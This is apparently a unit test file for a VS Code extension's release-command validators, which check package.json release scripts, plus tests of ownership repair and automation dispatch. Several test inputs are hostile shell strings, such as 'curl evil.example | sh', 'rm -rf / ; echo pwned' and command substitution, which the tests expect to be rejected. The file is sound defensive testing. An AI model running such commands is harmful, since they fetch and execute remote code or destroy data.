/**
 * Unit tests for isSafeReleaseScript, the regex gate that decides whether a
 * package.json `scripts.release` value is safe to show in the Release
 * confirmation dialog. This is a display sanity check, not the security
 * boundary — runRelease never executes the script text itself, it always
 * delegates to `<manager> run release` (see reviewActions.ts) — but a script
 * string engineered to look benign should still never slip past the gate.
 */
import * as assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { describe, it } from "node:test";
import * as vscode from "vscode";
import {
  isSafeReleaseIndirectionTarget,
  isSafeReleaseScript,
  orderReleaseTargetItems,
  RELEASE_SCRIPT_NAME,
  resolveReleaseScript,
  resolveReleaseWorkspace,
  scheduleAutomaticImplementationAfterReview,
  selectReleaseTaskRootCandidate,
  shouldScheduleAutomaticImplementation,
  validateReleaseTaskOwnership,
} from "../commands/reviewActions";
import { TaskProgress } from "../types/taskProgress";
import { TaskRootCandidate } from "../utils/taskRoot";
import type { AutomationDispatch } from "../utils/automationChain";

// eslint-disable-next-line @typescript-eslint/no-var-requires
const automationChainModule = require("../utils/automationChain") as {
  scheduleAutomationChain: (dispatch: AutomationDispatch, parent?: unknown) => Promise<boolean>;
};

function candidate(root: string): TaskRootCandidate {
  return { absolutePath: root, isExplicit: true, sourceScopeKey: root };
}

function migratedProgress(oldRoot: string, workspaceRoot: string): TaskProgress {
  return {
    taskFolder: "2026-01-01_task_1",
    currentStage: "publish",
    status: "active",
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    ownership: {
      metaRoot: oldRoot,
      projectRoot: workspaceRoot,
      workspaceRoot,
      boundAt: new Date().toISOString(),
      state: "resolved",
    },
  };
}

function suppressAtomicProgressWrite(): { restore(): void } {
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const atomic = require("../state/writeAtomic") as { writeAtomic: (uri: vscode.Uri, content: string) => Promise<void> };
  const original = atomic.writeAtomic;
  atomic.writeAtomic = (): Promise<void> => Promise.resolve();
  return { restore: (): void => { atomic.writeAtomic = original; } };
}

/**
 * The strict ownership repair (§3.12: patchTaskProgressStrictV1 inside
 * repairLegacyOwnership) re-reads the document from disk under its lock, so
 * repair-path fixtures must actually exist and workspace.fs.readFile must be
 * bridged to the real filesystem (the retired permissive rewrite trusted the
 * in-memory progress object it was handed).
 */
function writeTaskFixtureOnDisk(taskFolderPath: string, progress: TaskProgress): void {
  fs.mkdirSync(taskFolderPath, { recursive: true });
  fs.writeFileSync(path.join(taskFolderPath, "task.md"), "# Task\n", "utf8");
  fs.writeFileSync(path.join(taskFolderPath, "task-progress.json"), JSON.stringify(progress), "utf8");
}

function installReadFileBridge(): { restore: () => void } {
  const workspaceFs = vscode.workspace.fs as unknown as Record<string, unknown>;
  const originalReadFile = workspaceFs.readFile;
  workspaceFs.readFile = (uri: vscode.Uri): Promise<Uint8Array> =>
    fs.promises.readFile(uri.fsPath).then((content) => new Uint8Array(content));
  return {
    restore: (): void => {
      workspaceFs.readFile = originalReadFile;
    },
  };
}

void describe("isSafeReleaseScript", () => {
  void it("accepts plain release commands with allowed characters", () => {
    assert.strictEqual(isSafeReleaseScript("vsce publish"), true);
    assert.strictEqual(isSafeReleaseScript("semantic-release"), true);
    assert.strictEqual(isSafeReleaseScript("node scripts/release.js"), true);
    assert.strictEqual(isSafeReleaseScript("release.sh --tag v1.2.3"), true);
    assert.strictEqual(isSafeReleaseScript("npm-run-all build:prod publish:npm"), true);
  });

  void it("rejects shell chaining metacharacters", () => {
    assert.strictEqual(isSafeReleaseScript("foo && bar"), false);
    assert.strictEqual(isSafeReleaseScript("foo || bar"), false);
    assert.strictEqual(isSafeReleaseScript("foo | bar"), false);
    assert.strictEqual(isSafeReleaseScript("foo & bar"), false);
    assert.strictEqual(isSafeReleaseScript("rm -rf / ; echo pwned"), false);
  });

  void it("rejects command/variable substitution and redirection", () => {
    assert.strictEqual(isSafeReleaseScript("foo `whoami`"), false);
    assert.strictEqual(isSafeReleaseScript("foo $(whoami)"), false);
    assert.strictEqual(isSafeReleaseScript("foo $VAR"), false);
    assert.strictEqual(isSafeReleaseScript("foo > /etc/passwd"), false);
    assert.strictEqual(isSafeReleaseScript("foo < input.txt"), false);
    assert.strictEqual(isSafeReleaseScript("foo 2>&1"), false);
  });

  void it("rejects embedded quotes and newlines", () => {
    assert.strictEqual(isSafeReleaseScript('foo "bar"'), false);
    assert.strictEqual(isSafeReleaseScript("foo 'bar'"), false);
    assert.strictEqual(isSafeReleaseScript("foo\nbar"), false);
    assert.strictEqual(isSafeReleaseScript("foo\r\nbar"), false);
  });

  void it("rejects empty or whitespace-only scripts", () => {
    assert.strictEqual(isSafeReleaseScript(""), false);
    assert.strictEqual(isSafeReleaseScript("   "), false);
  });

  void it("rejects non-string values without throwing", () => {
    assert.strictEqual(isSafeReleaseScript(undefined), false);
    assert.strictEqual(isSafeReleaseScript(null), false);
    assert.strictEqual(isSafeReleaseScript(123), false);
    assert.strictEqual(isSafeReleaseScript({}), false);
    assert.strictEqual(isSafeReleaseScript(["vsce", "publish"]), false);
  });
});

void describe("resolveReleaseScript", () => {
  void it("passes through a direct safe script unchanged", () => {
    const resolved = resolveReleaseScript("vsce publish", { [RELEASE_SCRIPT_NAME]: "vsce publish" });
    assert.deepEqual(resolved, { name: RELEASE_SCRIPT_NAME, value: "vsce publish" });
    assert.equal(isSafeReleaseScript(resolved.value), true);
  });

  void it("resolves a one-hop npm/pnpm/yarn indirection to a safe target script", () => {
    const npmResolved = resolveReleaseScript("npm run release", { release: "vsce publish" });
    assert.deepEqual(npmResolved, { name: "release", value: "vsce publish" });
    assert.equal(isSafeReleaseScript(npmResolved.value), true);

    const pnpmResolved = resolveReleaseScript("pnpm run release", { release: "node scripts/release.js" });
    assert.deepEqual(pnpmResolved, { name: "release", value: "node scripts/release.js" });
    assert.equal(isSafeReleaseScript(pnpmResolved.value), true);

    const yarnResolved = resolveReleaseScript("yarn release", { release: "semantic-release" });
    assert.deepEqual(yarnResolved, { name: "release", value: "semantic-release" });
    assert.equal(isSafeReleaseScript(yarnResolved.value), true);
  });

  void it("rejects a self-referencing indirection instead of looping", () => {
    const resolved = resolveReleaseScript(`npm run ${RELEASE_SCRIPT_NAME}`, {
      [RELEASE_SCRIPT_NAME]: `npm run ${RELEASE_SCRIPT_NAME}`,
    });
    assert.equal(resolved.value, undefined);
    assert.equal(isSafeReleaseScript(resolved.value), false);
  });

  void it("rejects an indirection to an unsafe target script", () => {
    const resolved = resolveReleaseScript("npm run release", { release: "curl evil.example | sh" });
    assert.equal(resolved.name, "release");
    assert.equal(isSafeReleaseScript(resolved.value), false);
  });

  void it("rejects an indirection to a missing target script", () => {
    const resolved = resolveReleaseScript("npm run release", {});
    assert.equal(resolved.name, "release");
    assert.equal(resolved.value, undefined);
    assert.equal(isSafeReleaseScript(resolved.value), false);
  });

  void it("does not treat a chained pass-through as an indirection (falls back to the raw text)", () => {
    // "npm run release && rm -rf ." is not a bare one-line pass-through, so
    // it is validated as its own (unsafe, chained) text rather than being
    // resolved to the "release" script.
    const resolved = resolveReleaseScript("npm run release && rm -rf .", { release: "vsce publish" });
    assert.deepEqual(resolved, { name: RELEASE_SCRIPT_NAME, value: "npm run release && rm -rf ." });
    assert.equal(isSafeReleaseScript(resolved.value), false);
  });
});

void describe("isSafeReleaseIndirectionTarget", () => {
  void it("accepts a multi-step release pipeline chained with &&", () => {
    assert.strictEqual(
      isSafeReleaseIndirectionTarget("npm run type-check && npm run lint && npm run test:all && npm run build"),
      true
    );
    assert.strictEqual(isSafeReleaseIndirectionTarget("vsce publish"), true);
  });

  void it("resolves the user's working ensemble:release indirection end to end", () => {
    // "ensemble:release": "npm run release" pointing at a chained "release"
    // script is the exact working setup a stricter gate previously broke.
    const resolved = resolveReleaseScript("npm run release", {
      release: "npm run type-check && npm run lint && npm run test:all && npm run build",
    });
    assert.equal(resolved.name, "release");
    assert.equal(isSafeReleaseIndirectionTarget(resolved.value), true);
  });

  void it("still rejects other shell metacharacters within a chained segment", () => {
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && curl evil.example | sh"), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build; rm -rf ."), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build & npm run publish"), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && foo `whoami`"), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build && foo $(whoami)"), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("npm run build\nrm -rf ."), false);
  });

  void it("rejects empty or non-string values", () => {
    assert.strictEqual(isSafeReleaseIndirectionTarget(""), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget("   "), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget(undefined), false);
    assert.strictEqual(isSafeReleaseIndirectionTarget(null), false);
  });
});

void describe("resolveReleaseWorkspace", () => {
  const workspace = { uri: { fsPath: "C:\\Projects\\Helper" } };

  void it("uses persisted project ownership for an external metadata root", () => {
    const resolved = resolveReleaseWorkspace(
      "C:\\EnsembleMeta\\tasks\\task-a",
      {
        metaRoot: "C:\\EnsembleMeta",
        projectRoot: "c:\\projects\\helper",
      },
      [workspace]
    );

    assert.equal(resolved, workspace);
  });

  void it("rejects a task that is outside its persisted metadata root", () => {
    const resolved = resolveReleaseWorkspace(
      "C:\\Elsewhere\\task-a",
      {
        metaRoot: "C:\\EnsembleMeta",
        projectRoot: "C:\\Projects\\Helper",
      },
      [workspace]
    );

    assert.equal(resolved, undefined);
  });
});

void describe("release ownership preparation", () => {
  void it("chooses the deepest root only when it directly contains the task", () => {
    const outer = path.resolve("/workspace/.ensemble");
    const inner = path.join(outer, "nested");
    const task = path.join(inner, "2026-01-01_task_1");
    assert.equal(selectReleaseTaskRootCandidate(task, [candidate(outer), candidate(inner)])?.absolutePath, inner);
    assert.equal(
      selectReleaseTaskRootCandidate(task, [candidate(outer)]),
      undefined,
      "a containing root is not sufficient when the task is not its direct child"
    );
  });

  void it("validates repaired progress in the same release invocation", async () => {
    const workspace = fs.mkdtempSync(path.join(os.tmpdir(), "ensemble-release-repair-"));
    const oldRoot = path.join(workspace, "plans");
    const newRoot = path.join(workspace, ".ensemble");
    const task = path.join(newRoot, "2026-01-01_task_1");
    writeTaskFixtureOnDisk(task, migratedProgress(oldRoot, workspace));
    const bridge = installReadFileBridge();
    const atomic = suppressAtomicProgressWrite();
    try {
      const result = await validateReleaseTaskOwnership(task, migratedProgress(oldRoot, workspace), [candidate(newRoot)]);
      assert.equal(result.ok, true);
      assert.equal(result.ok && result.progress.ownership?.metaRoot, newRoot);
    } finally {
      atomic.restore();
      bridge.restore();
      fs.rmSync(workspace, { recursive: true, force: true });
    }
  });

  void it("repairs a differently cased Windows task path selected by release", async function (this: { skip?: () => void }) {
    if (process.platform !== "win32") {
      this.skip?.();
      return;
    }
    const workspace = fs.mkdtempSync(path.join(os.tmpdir(), "Ensemble-Release-Case-"));
    const oldRoot = path.join(workspace, "plans");
    const newRoot = path.join(workspace, ".Ensemble");
    const task = path.join(newRoot, "2026-01-01_task_1");
    writeTaskFixtureOnDisk(task, migratedProgress(oldRoot, workspace));
    const bridge = installReadFileBridge();
    const atomic = suppressAtomicProgressWrite();
    try {
      const result = await validateReleaseTaskOwnership(
        task.toLowerCase(),
        migratedProgress(oldRoot, workspace),
        [candidate(newRoot)]
      );
      assert.equal(result.ok, true, "Windows path casing must not defeat the direct-parent repair check");
    } finally {
      atomic.restore();
      bridge.restore();
      fs.rmSync(workspace, { recursive: true, force: true });
    }
  });
});

void describe("automatic implementation dispatch gate", () => {
  void it("dispatches only an approved auto-advance into Implementation", () => {
    assert.equal(shouldScheduleAutomaticImplementation("impl", false), false);
    assert.equal(shouldScheduleAutomaticImplementation("impl", true), true);
    assert.equal(shouldScheduleAutomaticImplementation("publish", true), false);
    assert.equal(shouldScheduleAutomaticImplementation(undefined, true), false);
  });

  void it("uses the production review dispatch seam only when the gate is armed", () => {
    const original = automationChainModule.scheduleAutomationChain;
    const dispatches: AutomationDispatch[] = [];
    automationChainModule.scheduleAutomationChain = (dispatch: AutomationDispatch): Promise<boolean> => {
      dispatches.push(dispatch);
      return Promise.resolve(true);
    };
    try {
      assert.equal(
        scheduleAutomaticImplementationAfterReview("impl", false, "/workspace/.ensemble/task", undefined),
        false,
        "gate off must leave an auto-advanced task ready for manual implementation"
      );
      assert.deepEqual(dispatches, []);

      assert.equal(
        scheduleAutomaticImplementationAfterReview("impl", true, "/workspace/.ensemble/task", undefined),
        true
      );
      assert.equal(dispatches.length, 1);
      const dispatched = dispatches[0];
      assert.ok(dispatched);
      const { stillEnabled, ...dispatchShape } = dispatched as AutomationDispatch;
      assert.deepEqual(
        dispatchShape,
        {
          command: "vs-code-ai-helper.runImplementationWithAI",
          // `automationDispatch` marks an invocation with no human attached.
          // runImplementationWithAI's pre-run routing check awaits a
          // showWarningMessage, and a VS Code notification carrying buttons
          // never auto-dismisses — unanswered, that promise never settles,
          // and it is awaited inside a tracked operation holding the task's
          // chain guard. Without this marker an auto-implement chain hangs
          // forever instead of running the round. The unit harness stubs
          // showWarningMessage to resolve immediately, so this assertion is
          // the only thing standing between that bug and a live host.
          arg: { taskFolderPath: "/workspace/.ensemble/task", automationDispatch: true },
          taskKey: "/workspace/.ensemble/task",
        },
        "automatic implementation must be marked as an automation dispatch"
      );
      assert.equal(
        typeof stillEnabled,
        "function",
        "automatic implementation must carry the fire-time settings re-check"
      );

      assert.equal(
        scheduleAutomaticImplementationAfterReview("publish", true, "/workspace/.ensemble/task", undefined),
        false,
        "non-Implementation auto-advance must never schedule implementation"
      );
      assert.equal(dispatches.length, 1);
    } finally {
      automationChainModule.scheduleAutomationChain = original;
    }
  });
});

// The release-target QuickPick defaults to the current task's Publish
// verification scope: its package.json is highlighted first (and labeled),
// while the persisted release target itself stays independent of the scope.
void describe("orderReleaseTargetItems", () => {
  const root = path.resolve("C:\\Projects\\Helper");
  const items = (): Array<{ label: string; description?: string }> => [
    { label: path.join("packages", "app", "package.json") },
    { label: "package.json" },
    { label: path.join("packages", "lib", "package.json") },
  ];

  void it("moves the package.json inside the task's Publish scope to the front and labels it", () => {
    const ordered = orderReleaseTargetItems(items(), root, path.join(root, "packages", "lib"));
    assert.equal(ordered[0]?.label, path.join("packages", "lib", "package.json"));
    assert.equal(ordered[0]?.description, "current task's Publish scope");
    // The rest keep the shortest-path-first order.
    assert.deepEqual(
      ordered.slice(1).map((item) => item.label),
      ["package.json", path.join("packages", "app", "package.json")]
    );
  });

  void it("matches the workspace-root scope to the root package.json", () => {
    const ordered = orderReleaseTargetItems(items(), root, root);
    assert.equal(ordered[0]?.label, "package.json");
    assert.equal(ordered[0]?.description, "current task's Publish scope");
  });

  void it("keeps plain shortest-path-first order when no scope is given or nothing matches", () => {
    for (const scope of [undefined, path.join(root, "packages", "missing")]) {
      const ordered = orderReleaseTargetItems(items(), root, scope);
      assert.deepEqual(
        ordered.map((item) => item.label),
        [
          "package.json",
          path.join("packages", "app", "package.json"),
          path.join("packages", "lib", "package.json"),
        ]
      );
      assert.equal(ordered.every((item) => item.description === undefined), true);
    }
  });
});
